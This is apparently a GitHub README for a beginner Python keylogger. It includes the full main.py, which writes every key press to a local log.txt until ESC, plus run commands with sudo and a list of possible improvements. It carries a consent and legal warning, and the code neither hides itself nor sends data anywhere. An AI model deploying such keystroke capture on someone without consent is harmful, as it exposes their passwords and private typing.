# Creation-of-a-Keylogger

A basic keylogger written in Python that records pressed keys to a text file.

## Legal Warning

**Use only for educational purposes or with explicit consent.** Unauthorized use of keyloggers may be illegal in many jurisdictions.

## Features

- Records all pressed keys in a `log.txt` file
- Automatically closes when `ESC` is pressed
- No additional dependencies required (only `keyboard` library)

## Requirements

- Python 3.x
- `keyboard` library

## Installation

1. Clone or download the repository
2. Install the required dependency:

```bash
pip install -r requirements.txt
```

**Note:** On Linux/macOS systems, you may need to run with administrator privileges:

```bash
sudo pip install -r requirements.txt
```

## Usage

Run the main script:

```bash
python main.py
```

The program will start recording all pressed keys. Press `ESC` to stop the keylogger and close the program.

## Output File

Keys are saved to `log.txt` in the same directory where the script is executed. The file is created automatically if it doesn't exist.

## Code Structure

The main functionality is in `main.py`:

```python
import keyboard

def press(key):
    with open("log.txt", "a") as log:
        log.write(key.name)

keyboard.on_press(press)
keyboard.wait('esc')
```

## How It Works

- `keyboard.on_press(press)`: Registers the function that executes with each key press
- `keyboard.wait('esc')`: Keeps the program running until ESC is pressed
- Each key is written to the file immediately

## Execution Examples

### Basic Execution
```bash
python main.py
```
Output: Creates `log.txt` with all pressed keys until ESC is pressed.

### Checking Output
```bash
python main.py
# Press some keys: hello world
# Press ESC
cat log.txt
```
Expected output in `log.txt`: `helloworld`

### With Administrator Privileges (Linux/macOS)
```bash
sudo python main.py
```

## Limitations

- Does not record special characters in readable format (shows key names)
- File opens and closes with each key (may impact performance on slow systems)
- No advanced configuration options

## Project Structure

```
keylogger-project/
├── main.py
├── requirements.txt
└── README.md
```

## Files

- `main.py`: Main keylogger script
- `requirements.txt`: Python dependencies
- `README.md`: This documentation file

## Possible Improvements

- Filter specific keys
- Add timestamps
- Format output for better readability
- Add more exit options
- Add configuration file

